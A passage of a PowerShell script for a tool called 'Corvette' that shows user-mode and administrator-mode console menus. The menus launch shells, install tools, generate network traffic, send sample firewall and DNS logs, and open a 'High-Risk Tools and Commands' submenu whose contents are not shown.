            }
            "7" {
                [HighRiskToolsAndCommands]::New($this.props).Run()
            }
            "8" {
                [RsgcliMenu]::New($this.props).Run()
            }
            "9" {
                [FortigateLogs]::New($this.props).Run()
            }
            "10" {
                [CheckPointLogs]::New($this.props).Run()
            }
            "11" {
                [CiscoLogs]::New($this.props).Run()
            }
            "12" {
                [PaloAltoNGFWLogs]::New($this.props).Run()
            }
            "13" {
                [BindLogs]::New($this.props).Run()
            }
            "14" {
                [NetflowLogs]::New($this.props).Run()
            }
            "15" {
                [ServerMenu]::New($this.props).Run()
            }
            default {
                return $false
            }
        }
        return $true
    }

    hidden [void]OpenUserModeMenu() {
        Write-Host "Corvette"
        while ($true) {
            Write-Host "************************************"
            Write-Host " c) Configure settings"
            Write-Host " 0) Run as administrator"
            Write-Host " 1) Download/Install tools"
            Write-Host " 2) Open an explorer"
            Write-Host " 3) Create a new command shell"
            Write-Host " 4) Create a new powershell"
            Write-Host " 5) Create a new command shell (Run as administrator)"
            Write-Host " 6) Create a new powershell (Run as administrator)"
            Write-Host " 7) High-Risk Tools and Commands"
            Write-Host " 8) Generate Network Traffic (rsgen)"
            Write-Host " 9) Send Fortigate Logs"
            Write-Host "10) Send CheckPoint Logs"
            Write-Host "11) Send Cisco Logs"
            Write-Host "12) Send Palo Alto Networks NGFW Logs"
            Write-Host "13) Send BIND Logs"
            Write-Host "14) Send Netflow Logs"
            Write-Host "15) Run Server"
            try {
                while (!$this.LaunchUserModeCommand((Read-Host "Please choose a menu item to run"))) {}
            } catch {
                Write-Host $_
            }
        }
    }

    hidden [bool]LaunchAdminModeCommand($cmd) {
        switch ($cmd) {
            "c" {
                [ConfigureSettings]::New($this.props).Run()
            }
            "0" {
                [SetupTools]::New($this.props).Run()
            }
            "1" {
                Start-Process -FilePath "explorer.exe" -ArgumentList @($this.props.home_dir)
            }
            "2" {
                Start-Process -FilePath "cmd.exe" -WorkingDirectory $this.props.home_dir
            }
            "3" {
                Start-Process -FilePath "powershell.exe" -WorkingDirectory $this.props.home_dir
            }
            "4" {
                [HighRiskToolsAndCommands]::New($this.props).Run()
            }
            "5" {
                [IptgenMenu]::New($this.props).Run()
            }
            "6" {
                [RsgcliMenu]::New($this.props).Run()
            }
            "7" {
                [FortigateLogs]::New($this.props).Run()
            }
            "8" {
                [CheckPointLogs]::New($this.props).Run()
            }
            "9" {
                [CiscoLogs]::New($this.props).Run()
            }
            "10" {
                [PaloAltoNGFWLogs]::New($this.props).Run()
            }
            "11" {
                [BindLogs]::New($this.props).Run()
            }
            "12" {
                [NetflowLogs]::New($this.props).Run()
            }
            "13" {
                [ServerMenu]::New($this.props).Run()
            }
            default {
                return $false
            }
        }
        return $true
    }

    hidden [void]OpenAdminModeMenu() {
        Write-Host "Corvette"
        while ($true) {
            Write-Host "************************************"
            Write-Host " c) Configure settings"
            Write-Host " 0) Download/Install tools"
            Write-Host " 1) Open an explorer"
            Write-Host " 2) Create a new command shell"
            Write-Host " 3) Create a new powershell"
            Write-Host " 4) High-Risk Tools and Commands"
            Write-Host " 5) Generate Network Traffic (iptgen)"
            Write-Host " 6) Generate Network Traffic (rsgen)"
            Write-Host " 7) Send Fortigate Logs"
            Write-Host " 8) Send CheckPoint Logs"
            Write-Host " 9) Send Cisco Logs"
            Write-Host "10) Send Palo Alto Networks NGFW Logs"
            Write-Host "11) Send BIND Logs"
            Write-Host "12) Send Netflow Logs"
            Write-Host "13) Run Server"
            try {
                while (!$this.LaunchAdminModeCommand((Read-Host "Please choose a menu item to run"))) {}
            } catch {
                Write-Host $_
            }
        }
    }

    [void]OpenMenu() {
        $current = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
        if ($current.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
            $this.OpenAdminModeMenu()
        } else {
            $this.OpenUserModeMenu()
        }
    }
}

$props = [Properties]::New($MyInvocation)
$props.Initialize()

[Menu]::New($props).OpenMenu()
